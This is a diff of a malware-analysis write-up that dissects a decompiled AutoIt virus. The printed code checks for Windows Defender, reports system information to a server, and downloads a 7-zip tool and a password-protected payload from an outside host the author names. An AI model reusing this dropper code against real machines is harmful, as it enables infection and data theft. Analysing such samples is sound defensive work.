@@ -259,6 +259,8 @@ EndFunc
 You can decode the whole file with it!
 
 ### 6) The function series
+<br> Please note that the functions are spilted by the original virus maker or the decompiler, NOT by me. I can combine them into one, but I want to keep it separated.
+#### a) 1st function: do some name check and get the active windows name
 Back to the main function:
 ```autoit
 Func yuqcv()
@@ -311,7 +313,8 @@ Func main() ; Main!!!!! - Check if vaild name
 	EndIf
 EndFunc
 ```
-<br> Basically it check if the exe name is vailded, then decide to run or not
+<br> Basically it check if the exe name is vailded, then decide to run or not. Also, it get the active window name, to report later
+#### b) 2nd function: only allow one instance of the virus to run
 <br> Function `main2` looks like:
 ```autoit
 Func main2() ; Run only one instance
@@ -326,6 +329,7 @@ Func main2() ; Run only one instance
 EndFunc
 ```
 <br> It only allows one instance of the virus to run
+#### c) 3rd function: ping Google.com to check if internet available
 <br> Now come to `main3`
 ```autoit
 Func main3() ; Ping server
@@ -338,6 +342,7 @@ Func main3() ; Ping server
 EndFunc
 ```
 <br> It Ping google to check if internet connection is available - the old trick
+#### d) 4th function: Search for Windows Defender
 <br> `main4`:
 ```autoit
 Func main4() ; Search for Windows Defender
@@ -346,6 +351,7 @@ Func main4() ; Search for Windows Defender
 EndFunc
 ```
 <br> It checks if the process `MsMpEng.exe` available and report to the server. `MsMpEng.exe` is a part of Windows Defender.
+#### e) 5th function: Check if the virus has activated before or not
 <br> `main5`:
 ```autoit
 Func main5()
@@ -361,6 +367,7 @@ EndFunc
 ```
 <br> The virus write to the `HKCU\Software\Unzip` key with the value `Installed` and `Trust` to check if the virus has been activated or not
 <br> If the value `unzip` not found, it jump to the function `notfound_unzip`:
+#### f) 5.1 function: Check the window title name
 ```autoit
 Func notfound_unzip()
 	For $i = 1 To $lsrlgh[0] ; StringSplit("Start|cmd.exe|ProgramManager", "|")
@@ -374,6 +381,7 @@ EndFunc
 ```
 <br> From what I understand, it check if the Title of the script has the string 'Start', 'cmd.exe' or 'ProgramManager'. If it has none of them, it exits. I think it's a check if the script is vailded or not.
 <br> If `unzip` key is found, or if it passed the function `notfound_unzip`, it jump to the function `found_unzip`:
+#### g) 5.2 function: Collect and submit data to server, get virus link
 ```autoit
 Func found_unzip() ; Submit system information to server and get malaware from it!
 	; Finally, http request!
@@ -405,7 +413,7 @@ Func found_unzip() ; Submit system information to server and get malaware from i
 	EndIf
 	Global $sevenzipurl = $httprequest.GetResponseHeader("unzip")
 	Global $virusurl = $httprequest.GetResponseHeader("zip") ; Get the file url to download
-	main6($sevenzipurl, $virusurl)
+	main6($sevenzipurl, $virusurl) ; I have to pass as arguments since the keyword `Global` not work :(
 EndFunc
 ```
 <br> Note: for some reason the AutoIt version installed on my computer didn't recognise the macro `@CPUArch`, so I just replace it with `X64` because the executable is compiled only for X64.
@@ -424,3 +432,32 @@ EndFunc
 |`Trust`|Only send if the virus installed|
 <br> Then it sent to the server and wait for the status. If the status is not 200 (Successful), it print the error and exit.
 <br> If status is 200, the server will sent the `7-zip` extractor `7za.exe` and the virus archive `files.7z` download URL.
+<br> I have run this and got the `7-zip` link in the form of `http://pube.me/app/7za.exe?id=somerandomnumberhere` and `files.7z` is `http://pube.me/app/files.7z?id=somerandomnumberhere` with `somerandomnumber` is a 4-digit number, but it doesn't matter.
+#### 6) 6th function: write to registry
+```autoit
+Func main6($sevenzipurl, $virusurl) ; Write Installed key
+	; Alright, the virus write to the key unzip to check if it has already installed or not
+	;RegWrite("HKCU\Software\Unzip", "Installed", "REG_SX[}q/q:OO=ZLb5o4g}m:Yes")
+	main7($sevenzipurl, $virusurl)
+EndFunc
+```
+<br> It now write to the registry to show that the virus has activated.
+#### 7) 7th function: prepare the virus directory
+```autoit
+Func main7($sevenzipurl, $virusurl) ; Create directory in appdata
+	DirCreate($virusdir) ; Create the directory in AppData
+	main8($sevenzipurl, $virusurl)
+EndFunc
+```
+<br> It create a folder `C:\User\YOURUSERNAME\AppData\Roaming\YOURUSERNAME\`. If you install Windows to something isn't `C:`, find it in that drive!
+#### 8) 8th function: download the 7-zip extractor and the virus
+```autoit
+Func main8($sevenzipurl, $virusurl) ; Download 7-zip and virus
+	If NOT FileExists($virusdir & "\7za.exe") Then ; Check if 7-zip available in that directory - to extract the virus
+		InetGet($sevenzipurl, $virusdir & "\7za.exe", 1, 0) ; Download 7-zip, force reload mode (force redownload even if exist), download then continue (running in foreground)
+	EndIf
+	InetGet($virusurl, $virusdir & "\files.7z", 1,0) ; Download virus in the form of 7z archive and set a password so antiviruses cannot detect
+	main9()
+EndFunc
+```
+<br> It check if `7za.exe` available in that directory or not, if not then download it from the provided `$sevenzipurl`. After that, download the virus with the provided URL at `$virusurl`
